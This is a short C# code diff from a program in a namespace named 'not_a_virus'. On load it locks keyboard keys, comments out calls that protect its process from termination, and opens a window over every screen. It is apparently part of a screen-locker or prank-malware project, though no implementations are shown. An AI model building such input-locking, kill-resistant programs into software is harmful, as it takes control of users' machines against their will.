@@ -23,9 +23,10 @@ namespace not_a_virus
         private void Form1_Load(object sender, EventArgs e)
         {
             new KeyLocker().Lock();
-            ProcessProtector.Protect();
+            //ProcessProtector.Protect();
+            //ProcessProtector.Unprotect();
 
-            foreach(Screen screen in Screen.AllScreens)
+            foreach (Screen screen in Screen.AllScreens)
             {
                 var screenshotter = new ScreenScreenshotter();
                 screenshotter.Show();
